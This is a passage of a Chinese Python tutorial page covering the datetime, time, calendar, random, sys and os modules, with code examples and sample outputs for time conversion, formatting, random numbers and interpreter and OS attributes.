dt.timestamp()                      # 把datetime转换为timestamp,输出:1429417200.0

timestamp转换为datetime
要把timestamp转换为datetime,使用datetime提供的fromtimestamp()方法

from datetime import datetime
t = 1429417200.0
print(datetime.fromtimestamp(t))  # 2015-04-19 12:20:00

timestamp是一个浮点数,它没有时区的概念,而datetime是有时区的。上述转换是在timestamp和本地时间做转换。

本地时间是指当前操作系统设定的时区。例如北京时区是东8区,则本地时间:
2015-04-19 12:20:00
实际上就是UTC+8:00时区的时间:
2015-04-19 12:20:00 UTC+8:00
而此刻的格林威治标准时间与北京时间差了8小时,也就是UTC+0:00时区的时间应该是:
2015-04-19 04:20:00 UTC+0:00

timestamp也可以直接被转换到UTC标准时区的时间:
from datetime import datetime
t = 1429417200.0
print(datetime.fromtimestamp(t))    # 本地时间,输出:2015-04-19 12:20:00
print(datetime.utcfromtimestamp(t)) # UTC时间,输出:2015-04-19 04:20:00

str转换为datetime
有时用户输入的日期和时间是字符串,要处理日期和时间则首先必须把str转换为datetime。转换方法是通过datetime.strptime()实现,需要一个日期和时间的格式化字符串,转换后的datetime是没有时区信息的

from datetime import datetime
cday = datetime.strptime('2015-6-1 18:19:59', '%Y-%m-%d %H:%M:%S')  # 字符串'%Y-%m-%d %H:%M:%S'规定了日期和时间部分的格式
print(cday)    # 2015-06-01 18:19:59

datetime转换为str
如果已经有了datetime对象,要把它格式化为字符串显示给用户,就需要转换为str,转换方法是通过strftime()实现的,同样需要一个日期和时间的格式化字符串:

from datetime import datetime
now = datetime.now()
print(now.strftime('%a, %b %d %H:%M'))  # Mon, May 05 16:28

datetime加减
对日期和时间进行加减实际上就是把datetime往后或往前计算得到新的datetime,算出前几天和后几天的时刻。加减可以直接用+和-运算符,不过需要导入timedelta这个类:

from datetime import datetime, timedelta
now = datetime.now()
now                                # datetime.datetime(2015, 5, 18, 16, 57, 3, 540997)
now + timedelta(hours=10)          # datetime.datetime(2015, 5, 19, 2, 57, 3, 540997)
now - timedelta(days=1)            # datetime.datetime(2015, 5, 17, 16, 57, 3, 540997)
now + timedelta(days=2, hours=12)  # datetime.datetime(2015, 5, 21, 4, 57, 3, 540997)

本地时间转换为UTC时间
本地时间是指系统设定时区的时间,例如北京时间是UTC+8:00时区的时间,而UTC时间指UTC+0:00时区的时间。
一个datetime类型有一个时区属性tzinfo,但默认为None,所以无法区分这个datetime到底是哪个时区,除非强行给datetime设置一个时区:

from datetime import datetime, timedelta, timezone
tz_utc_8 = timezone(timedelta(hours=8)) # 创建时区UTC+8:00
now = datetime.now()
now                                     # datetime.datetime(2015, 5, 18, 17, 2, 10, 871012)
dt = now.replace(tzinfo=tz_utc_8)       # 强制设置为UTC+8:00
dt                                      # datetime.datetime(2015, 5, 18, 17, 2, 10, 871012, tzinfo=datetime.timezone(datetime.timedelta(0, 28800)))
如果系统时区恰好是UTC+8:00,那么上述代码就是正确的,否则不能强制设置为UTC+8:00时区

时区转换
可以先通过utcnow()拿到当前的UTC时间,再转换为任意时区的时间
时区转换的关键在于,拿到一个datetime时,要获知其正确的时区,然后强制设置时区,作为基准时间
利用带时区的datetime,通过astimezone()方法,可以转换到任意时区
不是必须从UTC+0:00时区转换到其他时区,任何带时区的datetime都可以正确转换,例如bj_dt到tokyo_dt的转换

utc_dt = datetime.utcnow().replace(tzinfo=timezone.utc)    # 拿到UTC时间,并强制设置时区为UTC+0:00
print(utc_dt)                                              # 2015-05-18 09:05:12.377316+00:00
bj_dt = utc_dt.astimezone(timezone(timedelta(hours=8)))    # astimezone()将转换时区为北京时间
print(bj_dt)                                               # 2015-05-18 17:05:12.377316+08:00
tokyo_dt = utc_dt.astimezone(timezone(timedelta(hours=9))) # astimezone()将转换时区为东京时间
print(tokyo_dt)                                            # 2015-05-18 18:05:12.377316+09:00
tokyo_dt2 = bj_dt.astimezone(timezone(timedelta(hours=9))) # astimezone()将bj_dt转换时区为东京时间
print(tokyo_dt2)                                           # 2015-05-18 18:05:12.377316+09:00

</pre>
</div>

<div id="time">
<h4>time和calendar模块</h4><pre>
Python提供了一个time和calendar模块可以用于格式化日期和时间,还有datetime模块、pytz模块、dateutil模块
time模块主要包含各种提供日期、时间功能的类和函数,该模块既提供了把日期、时间格式化为字符串的功能,也提供了从字符串恢复日期、时间的功能

在Python中通常有这几种方式来表示时间:
1、时间戳(timestamp):通常来说时间戳表示的是从1970年1月1日00:00:00开始按秒计算的偏移量,运行type(time.time())返回的是float类型
2、格式化的时间字符串
3、元组(struct_time):struct_time元组共有9个元素:(年,月,日,时,分,秒,一年中第几周,一年中第几天,夏令时)

</pre>Python的time模块下有很多函数可以转换常见日期格式,如time.time()用于获取当前时间戳<textarea>
import time;                  # 引入time模块

print(time.time())            # 当前时间戳:1563715426.04

print([e for e in dir(time) if not e.startswith('_')])
# ['CLOCK_MONOTONIC', 'CLOCK_MONOTONIC_RAW', 'CLOCK_PROCESS_CPUTIME_ID', 'CLOCK_REALTIME', 'CLOCK_THREAD_CPUTIME_ID', 'altzone', 'asctime', 'clock', 'clock_getres', 'clock_gettime', 'clock_settime', 'ctime', 'daylight', 'get_clock_info', 'gmtime', 'localtime', 'mktime', 'monotonic', 'perf_counter', 'process_time', 'sleep', 'strftime', 'strptime', 'struct_time', 'time', 'timezone', 'tzname', 'tzset']

</textarea><pre>
【 时间元组 】
在time模块内提供了一个time.struct_time类,该类代表一个时间对象,它主要包含9个属性

tm_year 年 如2017、2018等
tm_mon  月 如2、3等,范围为1~12
tm_mday 日 如2、3等,范围为1~31
tm_hour 时 如2、3等,范围为0~23
tm_min  分 如2、3等,范围为0~59
tm_sec  秒 如2、3等,范围为0~59
tm_wday 周 周一为0,范围为0~6
tm_yday 一年内第几天 如65,范围1~366
tm_isdst 夏时令 0、1或-1

Python可以用time.struct_time(tm_year=2018, tm_mon=5, tm_mday=2, tm_hour=8, tm_min=0, tm_sec=30, tm_wday=3, tm_yday=1, tm_isdst=0)很清晰地代表时间。

Python还可以用一个包含9个元素的元组来代表时间,该元组的9个元素和struct_time对象中9个属性的含义是一一对应的。比如程序可以使用(2018, 5, 2, 8, 0, 30, 3, 1, 0)来代表时间

</pre><textarea>
### 获取当前时间: 从返回浮点数的时间戳方式向时间元组转换,只要将浮点数传递给如localtime之类的函数
import time
print(time.localtime(time.time()))
# time.struct_time(tm_year=2019, tm_mon=7, tm_mday=21, tm_hour=21, tm_min=31, tm_sec=38, tm_wday=6, tm_yday=202, tm_isdst=0)

### 获取格式化的时间: 可以根据需求选取各种格式,但是最简单的获取可读的时间模式的函数是asctime():
print(time.asctime(time.localtime(time.time())))   # Sun Jul 21 21:31:38 2019

### 格式化日期: 可以使用time模块的strftime方法来格式化日期time.strftime(format[, t])
print(time.localtime())
# time.struct_time(tm_year=2019, tm_mon=7, tm_mday=27, tm_hour=21, tm_min=19, tm_sec=34, tm_wday=5, tm_yday=208, tm_isdst=0)
print(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))     # 格式化成2016-03-20 11:45:39形式
print(time.strftime("%a %b %d %H:%M:%S %Y", time.localtime()))  # 格式化成Sat Mar 28 22:24:24 2016形式

# 将格式字符串转换为时间戳
a = "Sat Mar 28 22:24:24 2016"
print(time.mktime(time.strptime(a,"%a %b %d %H:%M:%S %Y")))

</textarea><pre>
time模块中的strftime()和strptime()两个函数互为逆函数,其中strftime()用于将struct_time对象或时间元组转换为时间字符串;而strptime()函数用于将时间字符串转换为struct_time对象,这两个函数都涉及编写格式模板

python中时间日期格式化符号:
%a  本地化的星期几的缩写名,比如Sun代表星期天
%A  本地化的星期几的完整名
%b  本地化的月份的缩写名,比如Jan代表一月
%B  本地化的月份的完整名
%c  本地化的日期和时间的表示形式
%d  代表一个月中第几天的数值,范固01~31
%H  代表24小时制的小时,范围00~23
%I  代表12小时制的小时,范围01~12
%j  一年中第几天,范围001~366
%m  代表月份的数值,范围01~12
%M  代表分钟的数值,范围00~59
%p  上午或下午的本地化方式。当使用strptime()函数并使用%I指令解析小时时%p只影响小时字段
%S  代表分钟的数值,范围00~61。该范围确实是00~61,60在表示闰秒的时间戳时有效,而61则是由于一些历史原因造成的
%U  代表一年中表示第几周,星期天为每周第一天,范围00~53。一年中第一个星期天被认为处于第一周。用strptime()解析时间字符串时只有同时指定了星期几和年份该指令才会有效
%w  代表星期几的数值,范围0~6,其中0代表周日
%W  代表一年小第几周,星期一为每周的第一天,范围00~53。一年中第一个星期一被认为处于第一周。用strptime()解析时间字符串时只有同时指定了星期几和年份该指令才会有效
%x  本地化的日期的表示形式
%X  本地化的时间的表示形式
%y  年份的缩写,范围00~99,比如2018年就简写成18
%Y  年份的完整形式,如2018
%z  显示时区偏移
%Z  时区名(如果时区不行在则显示为空)
%%  用于代表%符号

【 Time模块包含了以下内置函数,既有时间处理的,也有转换时间格式的 】
time.time( )
返回当前时间的时间戳(1970纪元后经过的浮点秒数)
# 返回从1970年1970年1月1日0点整到现在过了多少秒。
print(time.time())

time.timezone
返回本地时区的时间偏移,以秒为单位
属性time.timezone是当地时区(未启动夏令时)距离格林威治的偏移秒数(>0美洲;<=0大部分欧洲,亚洲,非洲)
print(time.timezone) # 在国内东八区输出-28800

time.tzname
返回本地时区的名字,属性time.tzname包含一对根据情况的不同而不同的字符串,分别是带夏令时的本地时区名称和不带的
print(time.tzname) # ('DST', 'DST')

time.altzone
返回格林威治西部的夏令时地区的偏移秒数。如果该地区在格林威治东部会返回负值(如西欧,包括英国)。对夏令时启用地区才能使用。

time.asctime([tupletime])
接受并转换时间元组或struct_time并返回一个可读的形式为Tue Dec 11 18:07:14 2008"(2008年12月11日 周二18时07分14秒)的24个字符的字符串,如果不指定参数则默认转换当前时间。
# 将当前时间转换为时间字符串
print(time.asctime())  # Fri Aug  2 18:11:15 2019
# 将指定时间转换时间字符串,时间元组的后面3个元素没有设置
print(time.asctime((2018, 2, 4, 11, 8, 23, 0, 0 ,0))) # Mon Feb  4 11:08:23 2018

time.ctime([secs])
作用相当于asctime(localtime(secs)),未给参数相当于asctime()
将以秒数代表的时间转换为时间宇符串。
Python可以用从1970年1月1日0点整到现在所经过的秒数来代表当前时间,比如写30秒意味着时间是1970年1月1日0点0分30秒。但在实际输出时可能会受到时区的影响,比如中国处于东八区,因此实际上会输出1970年1月1日8点0分30秒
print(time.ctime(30)) # Thu Jan  1 08:00:30 1970

time.clock( )
用以浮点数计算的秒数返回当前的CPU时间,用来衡量不同程序的耗时,比time.time()更有用。

time.gmtime([secs])
接收时间戳(1970纪元后经过的浮点秒数)并返回格林威治天文时间下的时间元组t,t.tm_isdst始终为0
将以秒数代表的时间转换为struct_time对象,如果不传入参数则使用当前时间。
# 将以秒数为代表的时间转换为struct_time对象
print(time.gmtime(30))
# time.struct_time(tm_year=1970, tm_mon=1, tm_mday=1, tm_hour=0, tm_min=0, tm_sec=30, tm_wday=3, tm_yday=1, tm_isdst=0)
# 将当前时间转换为struct_time对象
print(time.gmtime())
# time.struct_time(tm_year=2019, tm_mon=8, tm_mday=2, tm_hour=10, tm_min=22, tm_sec=10, tm_wday=4, tm_yday=214, tm_isdst=0)

time.localtime([secs])
接收时间戳(1970纪元后经过的浮点秒数)并返回当地时间下的时间元组t(t.tm_isdst可取0或1,取决于当地当时是不是夏令时)。
将以秒数代表的时间转换为代表当前时间的struct_time对象,如果不传入参数则使用当前时间。
print(time.localtime(30))
# time.struct_time(tm_year=1970, tm_mon=1, tm_mday=1, tm_hour=8, tm_min=0, tm_sec=30, tm_wday=3, tm_yday=1, tm_isdst=0)

time.mktime(tupletime)
接受时间元组并返回时间戳(1970纪元后经过的浮点秒数)
它是localtime的反转函数,用于将struct_time对象或元组代表的时间转换为从1970年1月1日0点整到现在过了多少秒。
print(time.mktime((2018, 2, 4, 11, 8, 23, 0, 0 ,0))) # 1517713703.0

time.sleep(secs)
推迟调用线程的运行,暂停secs秒,什么都不干
time.sleep(10)

time.strftime(fmt[,tupletime])
接收以时间元组,并返回以可读字符串表示的当地时间,格式由fmt决定
将时间元组或struct_time对象格式化为指定格式的时间字符串,如果不指定参数则默认转换当前时间。
print(time.strftime('%Y-%m-%d %H:%M:%S'))

time.strptime(str,fmt='%a %b %d %H:%M:%S %Y')
time.strptime(string[, format])
根据fmt的格式把一个时间字符串解析为时间元组,将字符串格式的时间解析成struct_time对象
print(time.strptime('2018年3月20日', '%Y年%m月%d日'))
# time.struct_time(tm_year=2018, tm_mon=3, tm_mday=20, tm_hour=0, tm_min=0, tm_sec=0, tm_wday=1, tm_yday=79, tm_isdst=-1)

time.tzset()
根据环境变量TZ重新初始化时间相关设置。

time.perf_counter()
返回性能计数器的值,以秒为单位。
print(time.perf_counter())

time.process_time()
返回当前进程使用CPU的时间,以秒为单位。
print(time.process_time())

【 日历(Calendar)模块 】
Calendar模块有很广泛的方法用来处理年历和月历
星期一是默认的每周第一天,星期天是默认的最后一天。更改设置需调用calendar.setfirstweekday()函数。模块包含了以下内置函数:

calendar.calendar(year,w=2,l=1,c=6)
返回一个多行字符串格式的year年年历,3个月一行,间隔距离为c。 每日宽度间隔为w字符。每行长度为21* W+18+2* C。l是每星期行数。

calendar.firstweekday( )
返回当前每周起始日期的设置,默认首次载入caendar模块时返回0即星期一。

calendar.isleap(year)
是闰年返回True,否则为False。
import calendar
print(calendar.isleap(2000))  # True
print(calendar.isleap(1900))  # False

calendar.leapdays(y1,y2)
返回在Y1、Y2两年之间的闰年总数。

calendar.month(year,month,w=2,l=1)
返回一个多行字符串格式的year年month月日历,两行标题,一周一行。每日宽度间隔为w字符。每行的长度为7* w+6。l是每星期的行数。

calendar.monthcalendar(year,month)
返回一个整数的单层嵌套列表。每个子列表装载代表一个星期的整数。Year年month月外的日期都设为0;范围内的日子都由该月第几日表示,从1开始。

calendar.monthrange(year,month)
返回两个整数。第一个是该月的星期几的日期码,第二个是该月的日期码。日从0(星期一)到6(星期日);月从1到12。

calendar.prcal(year,w=2,l=1,c=6)
相当于print(calendar.calendar(year,w,l,c))

calendar.prmonth(year,month,w=2,l=1)
相当于print(calendar.calendar(year,w,l,c))

calendar.setfirstweekday(weekday)
设置每周的起始日期码。0(星期一)到6(星期日)。

calendar.timegm(tupletime)
和time.gmtime相反:接受一个时间元组形式,返回该时刻的时间戳(1970纪元后经过的浮点秒数)。

calendar.weekday(year,month,day)
返回给定日期的日期码。0(星期一)到6(星期日)。月份为 1(一月) 到 12(12月)。

</pre>打印某月的月历<textarea>
import calendar
print(calendar.month(2019, 7))

# 输出
     July 2019
Mo Tu We Th Fr Sa Su
 1  2  3  4  5  6  7
 8  9 10 11 12 13 14
15 16 17 18 19 20 21
22 23 24 25 26 27 28
29 30 31

</textarea>
</div>

<div id="random">
<h4>random模块</h4><pre>
random模块主要包含生成伪随机数的各种功能变量和函数

random.seed(a=None, version=2):指定种子来初始化伪随机数生成器。
random.randrange(start, stop[, stop]):返回从start开始到stop结束、步长为step的随机数。其实就相当于choice(range(start, stop, step))的效果,只不过实际底层并不生成区间对象。
random.randint(a, b):生成一个范围为a≤N≤b的随机数。其等同于randrange(a, b+1)的效果。
random.choice(seq):从seq中随机抽取一个元素,如果seq为空则引发IndexError异常。
random.choices(seq, weights=None, cum_weights=None, k=1):从seq序列中抽取k个元素,还可通过weights指定各元素被抽取的权重(代表被抽取的可能性高低)。
random.shuffle(x[, random]):对x序列执行洗牌"随机排列"操作。
random.sample(population, k):随机取样,从population序列中随机抽取k个独立的元素。
random.random():生成一个从0.0(包含)到 1.0(不包含)之间的伪随机浮点数。
random.uniform(a, b):生成一个范围为a≤N≤b的随机数。
random.expovariate(lambd):生成呈指数分布的随机数。其中lambd参数(其实应该是lambda,只是lambda是Python关键字,所以简写成lambd)为1除以期望平均值。如果lambd是正值则返回的随机数是从0到正无穷大;如果lambd为负值则返回的随机数是从负无穷大到0

</pre><textarea>
import random
print(random.__all__)
# ['Random', 'seed', 'random', 'uniform', 'randint', 'choice', 'sample', 'randrange', 'shuffle', 'normalvariate', 'lognormvariate', 'expovariate', 'vonmisesvariate', 'gammavariate', 'triangular', 'gauss', 'betavariate', 'paretovariate', 'weibullvariate', 'getstate', 'setstate', 'getrandbits', 'choices', 'SystemRandom']

# 生成范围为0.0≤x<1.0的伪随机浮点数
print(random.random())                               # 0.06282234303336764

# 随机生成传入参数范围内的数字,即1或2或3
print(random.randint(1, 3))                          # 1

# 生成范围为2.5≤x<10.0 的伪随机浮点数
print(random.uniform(2.5, 10.0))                     # 6.4845555071809535

# 生成呈指数分布的伪随机浮点数
print(random.expovariate(1/5))                       # 9.707899380000603

# 生成从0到9的伪随机整数
print(random.randrange(10))                          # 2
# 生成从0到100的随机偶数
print(random.randrange(0, 101 , 2))                  # 70
# 随机生成传入参数范围内的数字,range顾头不顾尾
print(random.randrange(1, 3))                        # 2

# 随机抽取一个元素
print(random.choice(['Python','Swift','Kotlin']))    # Python
# 随机选择任意一个数字
print(random.choice([1, '23', [4, 5]]))              # 23
# 指定随机抽取6 个元素,各元素被抽取的权重(概率)不同
print(random.choices(['Python','Swift','Kotlin'], [5, 5, 1], k=6)) # ['Kotlin', 'Swift', 'Kotlin', 'Swift', 'Python', 'Python']

# 对列表元素进行随机排列
book_list = ['Python','Swift','Kotlin']
random.shuffle (book_list)
print (book_list)                                    # ['Swift', 'Python', 'Kotlin']

# 随机抽取4个独立的元素
print (random.sample([10, 20 , 30 , 40 , 50], k=4))  # [20, 10, 30, 50]
# 随机选择任意两个数字
print(random.sample([1, '23', [4, 5]], 2))           # [1, [4, 5]]

</textarea>随机生成一个验证码如u3]31、fUM5y、4Dh_0<textarea>
import random
def v_code():
    ret = ""
    for i in range(5):
        num = random.randint(0,9)
        alf = chr(random.randint(65,122))
        # 字母与数字随机拼接
        num_alf = str(random.choice([num, alf]))
        ret += num_alf
    return ret

print(v_code())

# 方法2
import string
import random
v_code = ''.join(random.sample(string.ascii_letters + string.digits, 4))

</textarea><textarea>
import random
import collections

#下面模拟从52张扑克牌中抽取20张
#在被拍到的20张牌中,牌面为10(包括J、Q、K的的牌占多大比例
#生成一个16个tens(代表10)和36 个low_cards(代表其他牌)的集合
deck= collections.Counter(tens=16, low_cards=36)
#从52 张牌中随机抽取20 张
seen= random.sample(list(deck.elements()), k=20)
#统计tens 元素有多少个,再除以20
print(seen.count('tens')/20)  # 0.45

</textarea>
</div>

<div id="sys">
<h4>sys模块</h4><pre>
sys模块代表了Python解释器,主要用于获取和Python解释器相关的信息

sys.argv:获取运行Python程序的命令行参数。sys.argv[0]通常就是指该Python程序,sys.argv[1]代表Python程序提供的第一个参数,sys.argv[2]代表Python程序提供的第二个参数……依此类推。
sys.byteorder:显示本地字节序的指示符。如果本地字节序是大端模式则该属性返回big;否则返回little。
sys.copyright:该属性返回与Python解释器有关的版权信息。
sys.executable:该属性返回Python解释器在磁盘上的存储路径。
sys.exit():通过引发SystemExit异常来退出程序。将其放在try块中不能阻止finally块的执行。
sys.flags:该只读属性返回运行Python命令时指定的旗标。
sys.getsizeof(obj):获取对象所占内存的大小,单位字节,len(string.encode('utf-8'))返回字符串占用的字节数
sys.getfilesystemencoding():返回在当前系统中保存文件所用的字符集。utf-8
sys.getrefcount(object):返回指定对象的引用计数,当object对象的引用计数为0时系统会回收该对象。
sys.getrecursionlimit():返回Python解释器当前支持的递归深度。该属性可通过setrecursionlimit()方法重新设置。
sys.getswitchinterval():返回在当前Python解释器中线程切换的时间间隔。该属性可通过setswitchinterval()函数改变。
sys.implementation:返回当前Python解释器的实现。
sys.maxsize:返回Python整数支持的最大值。在32位平台上该属性值为2**31-1;在64位平台上该属性值为2**63-1。
sys.modules:返回模块名和载入模块对应关系的字典。
sys.path:该属性指定Python查找模块的路径列表。程序可通过修改该属性来动态增加Python加载模块的路径。
sys.platform:返回Python解释器所在平台的标识符。linux
sys.stdin:返回系统的标准输入流——一个类文件对象。
sys.stdout:返回系统的标准输出流——一个类文件对象。
sys.stderr:返回系统的错误输出流——一个类文件对象。
sys.version:返回当前Python解释器的版本信息。3.6.8 (default, Jan 14 2019, 11:02:34)
sys.version_info:返回当前Python解释器的主版本号。[GCC 8.0.1 20180414 (experimental) [trunk revision 259383]] sys.version_info(major=3, minor=6, micro=8, releaselevel='final', serial=0)

</pre><textarea>
import sys

print([e for e in dir(sys) if not e.startswith('_')]) # sys模块没有__all__变量
# ['abiflags', 'api_version', 'argv', 'base_exec_prefix', 'base_prefix', 'builtin_module_names', 'byteorder', 'call_tracing', 'callstats', 'copyright', 'displayhook', 'dont_write_bytecode', 'exc_info', 'excepthook', 'exec_prefix', 'executable', 'exit', 'flags', 'float_info', 'float_repr_style', 'get_asyncgen_hooks', 'get_coroutine_wrapper', 'getallocatedblocks', 'getcheckinterval', 'getdefaultencoding', 'getdlopenflags', 'getfilesystemencodeerrors', 'getfilesystemencoding', 'getprofile', 'getrecursionlimit', 'getrefcount', 'getsizeof', 'getswitchinterval', 'gettrace', 'hash_info', 'hexversion', 'implementation', 'int_info', 'intern', 'is_finalizing', 'maxsize', 'maxunicode', 'meta_path', 'modules', 'path', 'path_hooks', 'path_importer_cache', 'platform', 'prefix', 'set_asyncgen_hooks', 'set_coroutine_wrapper', 'setcheckinterval', 'setdlopenflags', 'setprofile', 'setrecursionlimit', 'setswitchinterval', 'settrace', 'stderr', 'stdin', 'stdout', 'thread_info', 'version', 'version_info', 'warnoptions']

# 获取运行python程序的命令行参数List,sys.argv[0]是程序本身路径,sys.argv[1]代表Python程序提供的第一个参数,依此类推
print(sys.argv)       # ['./hello.py']

# 返回模块的搜索路径,初始化时使用PYTHONPATH环境变量的值(临时修改,不会保存)
print(sys.path)
# ['/mnt/e/wamp64/www/study/python', '/usr/lib/python36.zip', '/usr/lib/python3.6', '/usr/lib/python3.6/lib-dynload', '/home/berlin75/.local/lib/python3.6/site-packages', '/usr/local/lib/python3.6/dist-packages', '/usr/lib/python3/dist-packages']

# 退出程序,正常退出时exit(0),终止脚本的最直接方法是使用sys.exit()
sys.exit(0)

# sys模块还具有stdin ,stdout和stderr的属性,后者对于发出警告和错误消息非常有用,即使在stdout被重定向后也可以看到它们:
sys.stderr.write('Warning, log file not found starting a new one\n')
Warning, log file not found starting a new one

</textarea><pre>
【 动态修改模块加载路径 】
使用PYTHONPATH环境变量来添加Python模块的加载路径,但这种方式必须预先设置好。如果需要在程序运行时动态改变Python模块的加载路径,则可通过sys.path属性来实现。

sys.path也是很有用的一个属性,它可用于在程序运行时为Python动态修改模块加载路径。例如如下程序在运行时动态指定加载g:\fk_ext目录下的模块:

</pre><textarea>
import sys
# 动态添加g:\fk_ext路径作为模块加载路径
sys.path.append('g:\\fk_ext')
# 加载g:\fk_ext路径下的hello模块
import hello

</textarea>
</div>

<div id="os">
<h4>os模块是与操作系统交互的一个接口 操作系统接口</h4><pre>
os模块代表了程序所在的操作系统,主要用于获取程序运行所在操作系统的相关信息,还提供了大量操作文件和目录的函数

一定要使用import os而不是from os import *,这将避免内建的open()函数被os.open()隐式替换掉,它们的使用方式大不相同

</pre>对于日常文件和目录管理任务,shutil模块提供了更易于使用的更高级别的接口<textarea>
import shutil
print(shutil.copyfile('data.db', 'archive.db'))        # 'archive.db'
print(shutil.move('/build/executables', 'installdir')) # 'installdir'

print(os.__all__)
# ['copyfileobj', 'copyfile', 'copymode', 'copystat', 'copy', 'copy2', 'copytree', 'move', 'rmtree', 'Error', 'SpecialFileError', 'ExecError', 'make_archive', 'get_archive_formats', 'register_archive_format', 'unregister_archive_format', 'get_unpack_formats', 'register_unpack_format', 'unregister_unpack_format', 'unpack_archive', 'ignore_patterns', 'chown', 'which', 'get_terminal_size', 'SameFileError', 'disk_usage']

</textarea><pre>
import os
print(os.__all__)
# ['altsep', 'curdir', 'pardir', 'sep', 'pathsep', 'linesep', 'defpath', 'name', 'path', 'devnull', 'SEEK_SET', 'SEEK_CUR', 'SEEK_END', 'fsencode', 'fsdecode', 'get_exec_path', 'fdopen', 'popen', 'extsep', '_exit', 'CLD_CONTINUED', 'CLD_DUMPED', 'CLD_EXITED', 'CLD_TRAPPED', 'DirEntry', 'EX_CANTCREAT', 'EX_CONFIG', 'EX_DATAERR', 'EX_IOERR', 'EX_NOHOST', 'EX_NOINPUT', 'EX_NOPERM', 'EX_NOUSER', 'EX_OK', 'EX_OSERR', 'EX_OSFILE', 'EX_PROTOCOL', 'EX_SOFTWARE', 'EX_TEMPFAIL', 'EX_UNAVAILABLE', 'EX_USAGE', 'F_LOCK', 'F_OK', 'F_TEST', 'F_TLOCK', 'F_ULOCK', 'GRND_NONBLOCK', 'GRND_RANDOM', 'NGROUPS_MAX', 'O_ACCMODE', 'O_APPEND', 'O_ASYNC', 'O_CLOEXEC', 'O_CREAT', 'O_DIRECT', 'O_DIRECTORY', 'O_DSYNC', 'O_EXCL', 'O_LARGEFILE', 'O_NDELAY', 'O_NOATIME', 'O_NOCTTY', 'O_NOFOLLOW', 'O_NONBLOCK', 'O_PATH', 'O_RDONLY', 'O_RDWR', 'O_RSYNC', 'O_SYNC', 'O_TMPFILE', 'O_TRUNC', 'O_WRONLY', 'POSIX_FADV_DONTNEED', 'POSIX_FADV_NOREUSE', 'POSIX_FADV_NORMAL', 'POSIX_FADV_RANDOM', 'POSIX_FADV_SEQUENTIAL', 'POSIX_FADV_WILLNEED', 'PRIO_PGRP', 'PRIO_PROCESS', 'PRIO_USER', 'P_ALL', 'P_PGID', 'P_PID', 'RTLD_DEEPBIND', 'RTLD_GLOBAL', 'RTLD_LAZY', 'RTLD_LOCAL', 'RTLD_NODELETE', 'RTLD_NOLOAD', 'RTLD_NOW', 'R_OK', 'SCHED_BATCH', 'SCHED_FIFO', 'SCHED_IDLE', 'SCHED_OTHER', 'SCHED_RESET_ON_FORK', 'SCHED_RR', 'SEEK_DATA', 'SEEK_HOLE', 'ST_APPEND', 'ST_MANDLOCK', 'ST_NOATIME', 'ST_NODEV', 'ST_NODIRATIME', 'ST_NOEXEC', 'ST_NOSUID', 'ST_RDONLY', 'ST_RELATIME', 'ST_SYNCHRONOUS', 'ST_WRITE', 'TMP_MAX', 'WCONTINUED', 'WCOREDUMP', 'WEXITED', 'WEXITSTATUS', 'WIFCONTINUED', 'WIFEXITED', 'WIFSIGNALED', 'WIFSTOPPED', 'WNOHANG', 'WNOWAIT', 'WSTOPPED', 'WSTOPSIG', 'WTERMSIG', 'WUNTRACED', 'W_OK', 'XATTR_CREATE', 'XATTR_REPLACE', 'XATTR_SIZE_MAX', 'X_OK', 'abort', 'access', 'chdir', 'chmod', 'chown', 'chroot', 'close', 'closerange', 'confstr', 'confstr_names', 'cpu_count', 'ctermid', 'device_encoding', 'dup', 'dup2', 'environ', 'error', 'execv', 'execve', 'fchdir', 'fchmod', 'fchown', 'fdatasync', 'fork', 'forkpty', 'fpathconf', 'fspath', 'fstat', 'fstatvfs', 'fsync', 'ftruncate', 'get_blocking', 'get_inheritable', 'get_terminal_size', 'getcwd', 'getcwdb', 'getegid', 'geteuid', 'getgid', 'getgrouplist', 'getgroups', 'getloadavg', 'getlogin', 'getpgid', 'getpgrp', 'getpid', 'getppid', 'getpriority', 'getrandom', 'getresgid', 'getresuid', 'getsid', 'getuid', 'getxattr', 'initgroups', 'isatty', 'kill', 'killpg', 'lchown', 'link', 'listdir', 'listxattr', 'lockf', 'lseek', 'lstat', 'major', 'makedev', 'minor', 'mkdir', 'mkfifo', 'mknod', 'nice', 'open', 'openpty', 'pathconf', 'pathconf_names', 'pipe', 'pipe2', 'posix_fadvise', 'posix_fallocate', 'pread', 'putenv', 'pwrite', 'read', 'readlink', 'readv', 'remove', 'removexattr', 'rename', 'replace', 'rmdir', 'scandir', 'sched_get_priority_max', 'sched_get_priority_min', 'sched_getaffinity', 'sched_getparam', 'sched_getscheduler', 'sched_param', 'sched_rr_get_interval', 'sched_setaffinity', 'sched_setparam', 'sched_setscheduler', 'sched_yield', 'sendfile', 'set_blocking', 'set_inheritable', 'setegid', 'seteuid', 'setgid', 'setgroups', 'setpgid', 'setpgrp', 'setpriority', 'setregid', 'setresgid', 'setresuid', 'setreuid', 'setsid', 'setuid', 'setxattr', 'stat', 'stat_float_times', 'stat_result', 'statvfs', 'statvfs_result', 'strerror', 'symlink', 'sync', 'sysconf', 'sysconf_names', 'system', 'tcgetpgrp', 'tcsetpgrp', 'terminal_size', 'times', 'times_result', 'truncate', 'ttyname', 'umask', 'uname', 'uname_result', 'unlink', 'unsetenv', 'urandom', 'utime', 'wait', 'wait3', 'wait4', 'waitid', 'waitid_result', 'waitpid', 'write', 'writev', 'makedirs', 'removedirs', 'renames', 'walk', 'fwalk', 'execl', 'execle', 'execlp', 'execlpe', 'execvp', 'execvpe', 'getenv', 'supports_bytes_environ', 'environb', 'getenvb', 'P_WAIT', 'P_NOWAIT', 'P_NOWAITO', 'spawnv', 'spawnve', 'spawnvp', 'spawnvpe', 'spawnl', 'spawnle', 'spawnlp', 'spawnlpe']

os.name:返回导入依赖模块的操作系统名称,通常可返回'posix'、'nt'、 'java'等值其中之一。win->'nt'; Linux->'posix'
os.environ:返回在当前系统上所有环境变量组成的字典。
os.fsencode(filename):该函数对类路径(path-like)的文件名进行编码。
os.fsdecode(filename):该函数对类路径(path-like)的文件名进行解码。
os.PathLike:这是一个类,代表一个类路径(path-like)对象。
os.getenv(key, default=None):获取指定环境变量的值。
os.getlogin():返回当前系统的登录用户名,os.getuid()、os.getgroups()、os.getgid()等获取用户ID、用户组、组ID等,通常只在UNIX系统上有效
os.getpid():获取当前进程ID。
os.getppid():获取当前进程的父进程ID。
os.putenv(key, value):该函数用于设置环境变量。
os.cpu_count():返回当前系统的CPU数量。
os.sep:返回路径分隔符。win下为"\\",Linux下为"/",print(type(os.swp))输出str
